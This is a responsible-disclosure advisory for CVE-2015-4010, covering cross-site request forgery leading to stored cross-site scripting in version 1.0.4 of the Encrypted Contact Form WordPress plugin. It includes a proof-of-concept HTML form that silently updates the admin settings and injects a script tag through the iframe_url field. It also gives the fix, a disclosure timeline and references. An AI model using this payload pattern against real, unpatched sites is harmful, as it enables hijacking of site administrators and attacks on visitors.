@@ -1,0 +1,76 @@
+# Title: CVE-2015-4010 - Cross-site Request Forgery & Cross-site Scripting in Encrypted
+Contact Form Wordpress Plugin v1.0.4
+# Submitter: Nitin Venkatesh
+# Product: Encrypted Contact Form Wordpress Plugin
+# Product URL: https://wordpress.org/plugins/encrypted-contact-form/
+# Vulnerability Type: Cross-site Request Forgery [CWE-352], Cross-site
+scripting[CWE-79]
+# Affected Versions: v1.0.4 and possibly below.
+# Tested versions: v1.0.4
+# Fixed Version: v1.1
+# Link to code diff: https://plugins.trac.wordpress.org/changeset/1125443/
+# Changelog: https://wordpress.org/plugins/encrypted-contact-form/changelog/
+# CVE Status: CVE-2015-4010
+
+## Product Information:
+
+Secure contact form for WordPress. Uses end-to-end encryption to send user
+information. Not even your hosting provider can view the content.
+
+Let users send you information in a secure way. Uses I.CX messaging service
+to encrypt user content in their own web browsers before sending to you.
+
+## Vulnerability Description:
+
+The forms in the admin area of the plugin are vulnerable to CSRF, via which
+the contact forms generated are susceptible to XSS via unsanitized POST
+parametre.
+
+For example, the admin function of updating an existing form can be done
+via CSRF. Hence, by submitting a crafted HTML string in the parametres via
+CSRF, a XSS attack gets launched which affects all the visitors of the
+page(s) containing the contact form.
+
+## Proof of Concept:
+
+<form action="http://localhost/wp-admin/options-general.php?page=conformconf";
+method="post">
+<input type="hidden" name="name" value="required" />
+<input type="hidden" name="email" value="optional" />
+<input type="hidden" name="phone" value="off" />
+<input type="hidden" name="message" value="required" />
+<input type="hidden" name="display_name" value="Example" />
+<input type="hidden" name="recipient_name" value="example" />
+<input type="hidden" name="cfc_page_name" value="" />
+<!-- Wordpress page-id value -->
+<input type="hidden" name="existing_page" value="28" />
+<input type="hidden" name="cfc_selection" value="upd" />
+<input type="hidden" name="iframe_url"
+value=""></iframe><script>alert('XSS!');</script>"
+/>
+<input type="submit" value="Update Page">
+</form>
+
+## Solution:
+
+Upgrade to v1.1 of the plugin.
+
+## Disclosure Timeline:
+
+2015-03-26 - Discovered. Contacted developer on support forums.
+2015-03-27 - Contacted developer via contact form on vendor site.
+2015-04-01 - Fixed v1.1 released.
+2015-05-15 - Published disclosure on FD.
+2015-05-16 - CVE assigned
+
+## References:
+
+CVE Assign - http://seclists.org/oss-sec/2015/q2/471
+http://packetstormsecurity.com/files/131955/
+https://wpvulndb.com/vulnerabilities/7992
+
+
+## Disclaimer:
+
+This disclosure is purely meant for educational purposes. I will in no way
+be responsible as to how the information in this disclosure is used.
